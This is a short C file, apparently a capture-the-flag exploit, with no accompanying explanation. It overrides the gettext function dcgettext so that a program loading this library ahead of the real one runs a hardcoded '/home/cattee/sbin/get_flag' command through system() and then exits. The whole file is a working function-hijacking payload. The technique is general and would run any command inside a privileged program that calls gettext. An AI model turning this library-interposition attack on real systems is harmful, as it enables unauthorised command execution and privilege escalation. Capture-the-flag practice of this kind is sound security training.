#include <string.h>
#include <stdlib.h>

int i = 0;

char * dcgettext (const char * domainname, const char * msgid, int category) {
    if (i == 0) {
        i++;
        chdir("/home/cattee/sbin");
        system("/home/cattee/sbin/get_flag");
    }
    exit(1);
    return 0;
}
